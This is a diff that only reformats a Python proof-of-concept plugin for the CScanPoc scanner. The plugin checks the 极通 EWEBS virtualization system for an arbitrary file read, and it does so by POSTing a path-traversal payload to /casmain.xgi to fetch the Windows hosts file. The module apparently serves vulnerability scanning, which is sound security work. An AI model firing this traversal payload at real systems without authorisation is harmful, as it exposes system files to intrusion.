@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'EWEBS_0000' # 平台漏洞编号，留空
+    vuln_id = 'EWEBS_0000'  # 平台漏洞编号，留空
     name = '极通EWEBS应用虚拟化系统任意系统文件读取'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2015-06-24'  # 漏洞公布时间
     desc = '''
         极通EWEBS应用虚拟化系统任意文件读取利用，文件操作参数未加过滤。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'EWEBS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '976e966b-51f8-47ad-8c49-1cda0660662c'
@@ -31,13 +33,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:https://www.wooyun.org/bugs/wooyun-2015-0121875
+
+            # refer:https://www.wooyun.org/bugs/wooyun-2015-0121875
             payload = "/casmain.xgi"
             data = "Language_S=../../../../windows/system32/drivers/etc/hosts"
             verify_url = self.target + payload
             req = requests.post(verify_url, data=data)
-            
+
             if req.status_code == 200 and '127.0.0.1' in req.content and 'localhost' in req.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -47,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
